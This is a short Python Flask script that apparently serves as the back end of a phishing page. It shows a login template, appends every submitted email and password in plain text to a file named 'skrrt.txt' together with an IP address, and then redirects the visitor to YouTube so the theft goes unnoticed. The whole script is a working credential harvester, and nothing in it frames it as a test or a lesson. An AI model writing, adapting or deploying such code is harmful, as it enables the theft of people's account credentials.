from flask import Flask, render_template, request, redirect, url_for
import socket

app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def home():
	h_name = socket.gethostname()
	IP_addres = socket.gethostbyname(h_name)
	if request.method == "POST":
		data = request.form.to_dict()
		with open("skrrt.txt", "a") as file:
			file.write(f"Email : {data['name']}, Password : {data['Password']},Ip :{IP_addres}\n")
		return redirect("https://www.youtube.com")

	return render_template("login.html")

if __name__ == "__main__":
	app.run(debug=True)